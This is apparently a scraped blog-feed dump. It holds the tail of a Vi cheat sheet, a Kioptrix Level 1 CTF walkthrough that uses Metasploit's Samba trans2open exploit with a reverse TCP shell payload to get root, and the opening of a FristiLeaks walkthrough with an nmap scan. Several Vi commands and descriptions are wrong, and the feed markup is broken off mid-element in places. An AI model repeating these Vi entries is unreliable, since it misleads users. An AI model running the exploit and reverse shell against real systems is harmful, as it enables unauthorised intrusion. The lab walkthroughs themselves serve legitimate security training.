<td> <p><code>SHIFT+N</code></p> </td> \n    <td> <p>Vi search backward in file</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h2 id=\"vi-search-and-replace-commands\">Vi Search and Replace Commands</h2> \n<h3 id=\"vi-search-and-replace-first-instance\">Vi Search and Replace First Instance</h3> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Vi Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>:s/find-string/replace-string/</code></p> </td> \n    <td> <p>Vi search and replace first instance of specified string</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h3 id=\"vi-search-and-replace-on-a-single-line\">Vi Search and Replace on a Single Line</h3> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Vi Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>:s/find-string/replace-string/g</code></p> </td> \n    <td> <p>Vi search and replace all instances of specified string on current line</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h3 id=\"vi-search-and-replace-entire-file\">Vi Search and Replace Entire File</h3> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Vi Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>:%s/find-string/replace-string/g</code></p> </td> \n    <td> <p>Vi search and replace all instances of specified string for entire file</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h3 id=\"vi-search-for-part-of-a-word\">Vi Search for part of a Word</h3> \n<p>A fuzzy search allows you to find something that you only know part of, for example if you wanted to find all instances of lines starting with the word “Picard” you would use the following:</p> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Vi Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>/^Picard</code></p> </td> \n    <td> <p>Vi search within file words starting with Picard</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h3 id=\"vi-search-for-words-ending-with-string\">Vi Search for words ending with $string</h3> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Vi Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>/worf$</code></p> </td> \n    <td> <p>Vi search within file for word engine with worf</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h3 id=\"vi-search-for-metacharacters\">Vi Search for Metacharacters</h3> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Vi Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>/\\*</code></p> </td> \n    <td> <p>Vi search within file for metacharacters like, * </p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h3 id=\"vi-exact-match-search-only\">Vi Exact Match Search Only</h3> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Vi Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>/star\\.</code></p> </td> \n    <td> <p>Vi exact search only, will return instances of \"star only\", not starfleet or star-trek</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h3 id=\"vi-search-for-a-range-of-strings\">Vi Search for a range of Strings</h3> \n<p>Helpful for finding version numbers in text files.</p> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Vi Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>/v2.[1-9]</code></p> </td> \n    <td> <p>Vi search for a range, this example would return all v2.1-9 instances within the file, e.g. v2.4 v2.7 etc</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h3 id=\"vi-search-for-upper-and-lowercase\">Vi Search for Upper and Lowercase</h3> \n<p>Search for upper and lowercase strings in Vi.</p> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Vi Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>/ [tT] [hH [eE]</code></p> </td> \n    <td> <p>Vi search upper or lowercase strings, this example would return any instance of the word 'the'. e.g. The, THE, tHE, tHe </p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h2 id=\"advanced-vi-commands\">Advanced Vi commands</h2> \n<h3 id=\"vi-view-options\">Vi View Options</h3> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Vi Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>:set all</code></p> </td> \n    <td> <p>Lists all Vi options</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h3 id=\"vi-run-shell-commands\">Vi Run Shell Commands</h3> \n<p>Run shell commands from Vi.</p> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Vi Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>:! ls -l</code></p> </td> \n    <td> <p>Run shell command from Vi, in this example ls -l is executed</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h3 id=\"vi-joining-lines\">Vi Joining Lines</h3> \n<p>Backspace doesn’t always work…</p> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Vi Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>SHIFT+J</code></p> </td> \n    <td> <p>Position the cursor in either line you wish to join, and press <code>SHIFT+J</code></p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h3 id=\"vi-split-windows\">Vi Split Windows</h3> \n<p>Useful for comparing files, to switch between windows press <code>SHIFT+W</code></p> \n<h4 id=\"vi-split-window-horizontally\">Vi Split Window Horizontally</h4> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Vi Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>:split</code></p> </td> \n    <td> <p>Split window Horizontally in Vi</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h4 id=\"vi-split-window-virtically\">Vi Split Window Virtically</h4> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Vi Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>:vsplit</code></p> </td> \n    <td> <p>Split window Virtically in Vi</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h3 id=\"vi-close-all-split-windows\">Vi Close All Split Windows</h3> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Vi Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>:only</code></p> </td> \n    <td> <p>Closes all split windows and focuses on the primary window</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h2 id=\"vi-save-commands\">Vi Save commands</h2> \n<h3 id=\"how-to-save-in-vi\">How to Save in Vi</h3> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Vi Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>:w</code></p> </td> \n    <td> <p>Writes the file to disk</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h3 id=\"vi-save-and-exit\">Vi Save and Exit</h3> \n<p>How to save and exit Vi, personally I use <code>:wq</code></p> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Vi Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>:wq</code></p> </td> \n    <td> <p>Save and exit Vi</p> </td> \n   </tr> &lt;/tr&gt; \n   <tr> \n    <td> <p><code>:x</code></p> </td> \n    <td> <p>Exit - Vi will prompt and ask if you wish to save</p> </td> \n   </tr> &lt;/tr&gt; \n   <tr> \n    <td> <p><code>SHIFT+ZZ</code></p> </td> \n    <td> <p>Another way to Save and Exit Vi</p> </td> \n   </tr> &lt;/tr&gt; \n   <tr> \n    <td> <p><code>wq!</code></p> </td> \n    <td> <p>Forces save on read only files, and exits</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h2 id=\"misc-vi-commands\">Misc Vi Commands</h2> \n<h3 id=\"vi-undo-command\">Vi Undo Command</h3> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Vi Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>U</code></p> </td> \n    <td> <p>Press <code>SHIFT+U</code> to undo in Vi</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h3 id=\"vi-undo-all\">Vi Undo All</h3> \n<p>Vi undo all since last write.</p> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Vi Command</th> \n    <th>Description</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> <p><code>:+X+!</code></p> </td> \n    <td> <p>Undo everything since last write</p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h2 id=\"vi-show-file-name\">Vi Show File Name</h2> \n<p><code>SHIFT+G</code> shows the file name, number of lines and current position.</p> \n<h2 id=\"vi-multipliers\">Vi Multipliers</h2> \n<p>Almost every command in Vi can leverage multipliers, typically it’s a case of prefixing the command with a numnber. Example: <code>10W</code> would move 10 words to the right.</p>","descriptionType":"text/html","publishedDate":"Sun, 01 Nov 2015 09:39:10 +0000","feedId":11390,"bgimg":"","linkMd5":"68bcd8eef6a7ba7c93fc0fa00d01a451","bgimgJsdelivr":"","metaImg":"","author":"Arr0way","publishedOrCreatedDate":1598318675552},{"createdTime":"2020-08-25 09:24:35","updatedTime":"2020-08-25 09:24:35","title":"Kioptrix Level 1 Walkthrough","link":"https://highon.coffee/blog/kioptrix-level-1-walkthrough/","description":"<div class=\"coffee-rating\"> \n <table> \n  <tbody> \n   <tr> \n    <td> <p><code>Coffee Difficulty Rating:</code></p> </td> \n    <td> <p><i class=\"fa fa-coffee\"></i></p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<ul id=\"markdown-toc\"> \n <li><a href=\"https://highon.coffee/blog/kioptrix-level-1-walkthrough/#author-description\" id=\"markdown-toc-author-description\">Author Description</a></li> \n <li><a href=\"https://highon.coffee/blog/kioptrix-level-1-walkthrough/#service-enumeration\" id=\"markdown-toc-service-enumeration\">Service Enumeration</a></li> \n <li><a href=\"https://highon.coffee/blog/kioptrix-level-1-walkthrough/#samba-enumeration\" id=\"markdown-toc-samba-enumeration\">Samba Enumeration</a></li> \n <li><a href=\"https://highon.coffee/blog/kioptrix-level-1-walkthrough/#metasploit-exploit\" id=\"markdown-toc-metasploit-exploit\">Metasploit Exploit</a></li> \n <li><a href=\"https://highon.coffee/blog/kioptrix-level-1-walkthrough/#root-flag\" id=\"markdown-toc-root-flag\">Root Flag</a></li> \n</ul> \n<h2 id=\"author-description\">Author Description</h2> \n<p>The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.</p> \n<h2 id=\"service-enumeration\">Service Enumeration</h2> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Port</th> \n    <th>Service</th> \n    <th>Version Detection</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 22</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>SSH</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>OpenSSH 2.9p2 (protocol 1.99)</p> \n     </pc> </td> \n   </tr> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 80</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>HTTP</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>Apache httpd 1.3.20 ((Unix)</p> \n     </pc> </td> \n   </tr> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 111</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>RPC Bind</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>N/A</p> \n     </pc> </td> \n   </tr> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 139</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>netbios-ssn</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>Samba</p> \n     </pc> </td> \n   </tr> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 443</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>HTTPS</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>Apache httpd 1.3.20 ((Unix)</p> \n     </pc> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h2 id=\"samba-enumeration\">Samba Enumeration</h2> \n<p>Based on the age of the system other services, I know from exeperience that SAMBA is likely vulnerable to the trans2open exploit.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">use exploit/linux/samba/trans2open\n\nmsf exploit<span class=\"o\">(</span>trans2open<span class=\"o\">)</span> <span class=\"o\">&gt;</span> show options\n\nModule options <span class=\"o\">(</span>exploit/linux/samba/trans2open<span class=\"o\">)</span>:\n\n   Name   Current Setting  Required  Description\n   <span class=\"nt\">----</span>   <span class=\"nt\">---------------</span>  <span class=\"nt\">--------</span>  <span class=\"nt\">-----------</span>\n   RHOST  192.168.221.156  <span class=\"nb\">yes       </span>The target address\n   RPORT  139              <span class=\"nb\">yes       </span>The target port\n\n\nPayload options <span class=\"o\">(</span>generic/shell_reverse_tcp<span class=\"o\">)</span>:\n\n   Name   Current Setting  Required  Description\n   <span class=\"nt\">----</span>   <span class=\"nt\">---------------</span>  <span class=\"nt\">--------</span>  <span class=\"nt\">-----------</span>\n   LHOST  192.168.221.139  <span class=\"nb\">yes       </span>The listen address\n   LPORT  4444             <span class=\"nb\">yes       </span>The listen port\n\n\nExploit target:\n\n   Id  Name\n   <span class=\"nt\">--</span>  <span class=\"nt\">----</span>\n   0   Samba 2.2.x - Bruteforce</code></pre> \n</figure> \n<h2 id=\"metasploit-exploit\">Metasploit Exploit</h2> \n<figure class=\"o\">[</span>y/N]  y</code></pre> \n</figure> \n<h2 id=\"root-flag\">Root Flag</h2> \n<p>Root Flag</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">sh-2.05# <span class=\"nb\">cd</span> /var/spool/mail\n<span class=\"nb\">cd</span> /var/spool/mail\nsh-2.05# <span +0000","feedId":11390,"bgimg":"","linkMd5":"19ee16349f6231756215c981a4833bbb","bgimgJsdelivr":"","metaImg":"","author":"Arr0way","publishedOrCreatedDate":1598318675558},{"createdTime":"2020-08-25 09:24:35","updatedTime":"2020-08-25 09:24:35","title":"FristiLeaks 1.3 Walkthrough","link":"https://highon.coffee/blog/fristileaks-walkthrough/","description":"<div class=\"coffee-rating\"> \n <table> href=\"https://highon.coffee/blog/fristileaks-walkthrough/#root-flag\" id=\"markdown-toc-root-flag\">Root Flag</a></li> \n</ul> \n<h2 id=\"author-description\">Author Description</h2> \n<p>A small VM made for a Dutch informal hacker meetup called Fristileaks. Meant to be broken in a few hours without requiring debuggers, reverse engineering, etc..</p> \n<div class=\"note warning\"> \n <h5>VMWare Users - MAC Address</h5> \n <p>If you are a VMWare user, you'll need to manually set the MAC Address to <code>08:00:27:A5:A6:76</code>.</p> \n</div> \n<h3 id=\"port-scanning\">Port Scanning</h3> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">nmap <span class=\"nt\">-v</span> <span class=\"nt\">-p</span> 1-65535 <span class=\"nt\">-sV</span> <span class=\"nt\">-O</span> <span class=\"nt\">-sT</span> 192.168.221.150</code></pre> \n</figure> \n<h3 id=\"service-enumeration\">Service Enumeration</h3> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Port</th> \n    <th>Service</th> \n    <th>Version Detection</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 80</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>HTTP</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>Apache httpd 2.2.15 ((CentOS) DAV/2 PHP/5.3.3)</p> \n     </pc> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h3 id=\"http-enumeration\">HTTP Enumeration</h3> \n<p>Enumeration of the web application, revealed the page <code>/fristi</code> with the following form:</p> \n<p><img src=\"https://highon.coffee/img/blog/fristileaks/webform.png\" alt=\"webform\" /></p> \n<p>Page source interrogation revealed the following code comment:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">&lt;<span class=\"o\">!</span><span class=\"nt\">--</span>\nTODO:\nWe need to clean this up <span class=\"k\">for </span>production. I left some junk <span class=\"k\">in </span>here to make testing easier.\n\n- by eezeepz\n<span class=\"nt\">--</span><span class=\"o\">&gt;</span></code></pre> \n</figure> \n<p>The following base64 encoded image was also discovered and decoded to reveal an image containing the string: <code>keKkeKKeKKeKkEkkEk</code></p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"nb\">echo</span> <span class=\"s2\">\"iVBORw0KGgoAAAANSUhEUgAAAW0AAABLCAIAAAA04UHqAAAAAXNSR0IArs4c6QAAAARnQU1BAACx</span><span class=\"se\">\\n</span><span
